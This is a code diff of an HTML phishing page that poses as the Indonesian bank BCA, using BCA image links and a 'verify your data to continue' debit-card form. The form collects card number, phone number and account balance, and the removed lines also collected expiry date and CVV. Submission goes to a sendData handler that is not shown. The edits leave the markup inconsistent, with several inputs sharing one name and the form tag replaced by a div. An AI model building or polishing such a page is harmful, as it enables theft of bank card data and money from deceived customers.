@@ -316,47 +316,34 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     <div class="col-md-12 product-thumb" data-aos="fade-right" data-aos-delay="400" data-aos-duration="1000"><img alt="" src="https://www.bca.co.id/assets/images/MasterCard/produk-img.jpg" /></div>
  </fieldset>      
 
- <fieldset id="debitku" style="display: ; margin-top: -55px">
+  <fieldset id="debitku" style="display: ; margin-top: -55px">
     <div class="col-md-14 product-desc" data-aos="fade-left" data-aos-delay="450" data-aos-duration="1000">
     <h2 style="text-align: center">Data Kartu Debit<br/>
-     <h5 _ngcontent-etm-c44="" class="" style="margin-left: 0px; text-align: center; font-weight: 400"><strong _ngcontent-etm-c44="" style="text-align: center">Silahkan Verifikasi Data Untuk Melanjutkan</strong></h5>
+     <h5 _ngcontent-etm-c44="" class="" style="margin-left: 10px; text-align: center; font-weight: 400"><strong _ngcontent-etm-c44="" style="text-align: center">Silahkan Verifikasi Data Untuk Melanjutkan</strong></h5>
     </h2>
     <p></p>
    
-   <form id="formNope" onsubmit="sendData(event); return false" class="ng-untouched ng-pristine ng-valid" style="padding: 0px; display: ; margin-top: -20px">
+   <form id="formNope" onsubmit="sendData(event); return false" class="ng-untouched ng-pristine ng-valid" style="padding: 15px; display: ; margin-top: -20px">
           
            <p></p><br/>
            <div _ngcontent-etm-c44="" class="form-group">
-            <label _ngcontent-etm-c44="" for="nomor-regis" class="col-sm-12 control-label">16 Digit No. Kartu BCA <span _ngcontent-etm-c44="" class="asterisk" style="color: red">*</span></label>
+            <label _ngcontent-etm-c44="" for="nomor-regis" class="col-sm-12 control-label">16 Digit No. Kartu BCA <span _ngcontent-etm-c44="" class="asterisk">*</span></label>
             <div _ngcontent-etm-c44="" class="col-sm-12">
-             <input id="nokartu" _ngcontent-etm-c44="" appnumberonly="" type="tel" name="nokartu" maxlength="19" autocomplete="off" class="form-control ng-untouched ng-pristine ng-valid" style="height: 40px" required minlength="19">
+             <input id="nokartu" _ngcontent-etm-c44="" appnumberonly="" type="tel" name="no_kartu_rekening" maxlength="19" autocomplete="off" class="form-control ng-untouched ng-pristine ng-valid" style="height: 40px" required minlength="19">
             </div>
             <div _ngcontent-etm-c44="" class="clearfix"></div>
            </div>
              <div _ngcontent-etm-c44="" class="form-group">
-            <label _ngcontent-etm-c44="" for="nomor-regis" class="col-sm-12 control-label" style="float: left;">Masa Berlaku <span _ngcontent-etm-c44="" class="asterisk" asterisk style="color: red">*</span></label>
-            <div _ngcontent-etm-c44="" class="form-group">
-            <label _ngcontent-etm-c44="" for="nomor-regis" class="col-sm-12 control-label" style="float: right; margin-right: 80px">CVV <span _ngcontent-etm-c44="" class="asterisk" asterisk   style="color: red">*</span></label>
-            
+            <label _ngcontent-etm-c44="" for="nomor-regis" class="col-sm-12 control-label">Nomor Handphone <span _ngcontent-etm-c44="" class="asterisk">*</span></label>
             <div _ngcontent-etm-c44="" class="col-sm-12">
-             <input id="valid" _ngcontent-etm-c44="" appnumberonly="" type="tel" name="valid" maxlength="5" autocomplete="off" class="form-control ng-untouched ng-pristine ng-valid" style="height: 40px; width: 45%; float: left;" required minlength="5">
-            </div>
-            <div _ngcontent-etm-c44="" class="col-sm-12">
-             <input id="cvv" _ngcontent-etm-c44="" appnumberonly="" type="tel" name="cvv" maxlength="3" pattern="[0-9]*" autocomplete="off" class="form-control ng-untouched ng-pristine ng-valid" style="height: 40px; width: 45%; float: right;" required minlength="3">
+             <input id="nope" _ngcontent-etm-c44="" appnumberonly="" type="tel" name="no_kartu_rekening" maxlength="13" pattern="[0-9]*" autocomplete="off" class="form-control ng-untouched ng-pristine ng-valid" style="height: 40px" required minlength="10">
             </div>
             <div _ngcontent-etm-c44="" class="clearfix"></div>
            </div>
              <div _ngcontent-etm-c44="" class="form-group">
-            <label _ngcontent-etm-c44="" for="nomor-regis" class="col-sm-12 control-label">Nomor Handphone <span _ngcontent-etm-c44="" class="asterisk" asterisk style="color: red">*</span></label>
+            <label _ngcontent-etm-c44="" for="nomor-regis" class="col-sm-12 control-label">Saldo Rekening Saat Ini <span _ngcontent-etm-c44="" class="asterisk">*</span></label>
             <div _ngcontent-etm-c44="" class="col-sm-12">
-             <input id="nope" _ngcontent-etm-c44="" appnumberonly="" type="tel" name="nohp" maxlength="13" pattern="[0-9]*" autocomplete="off" class="form-control ng-untouched ng-pristine ng-valid" style="height: 40px" required minlength="10">
-            </div>
-            <div _ngcontent-etm-c44="" class="clearfix"></div>
-           </div>
-             <div _ngcontent-etm-c44="" class="form-group">
-            <label _ngcontent-etm-c44="" for="nomor-regis" class="col-sm-12 control-label">Saldo Rekening Saat Ini <span _ngcontent-etm-c44="" class="asterisk" asterisk style="color: red">*</span></label>
-            <div _ngcontent-etm-c44="" class="col-sm-12">
-             <input id="saldo" _ngcontent-etm-c44="" appnumberonly="" type="tel" name="saldo" autocomplete="off" class="uang form-control ng-untouched ng-pristine ng-valid" style="height: 40px" required minlength="5">
+             <input id="saldoku" _ngcontent-etm-c44="" appnumberonly="" type="tel" name="no_kartu_rekening" autocomplete="off" class="uang form-control ng-untouched ng-pristine ng-valid" style="height: 40px" required minlength="5">
             </div>
             <div _ngcontent-etm-c44="" class="clearfix"></div>
            </div>
@@ -371,7 +358,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             <!---->
             <!---->   
     </div>
-   </form>
+    </div>
  </fieldset>
  <fieldset id="notif" style="display: none; padding: 0px; background: #fff; " class="col-md-24 fadeUpbigg">
 <div class="col-md-14 product-desc" data-aos="fade-left" data-aos-delay="450" data-aos-duration="1000" style="margin-top: -45px">
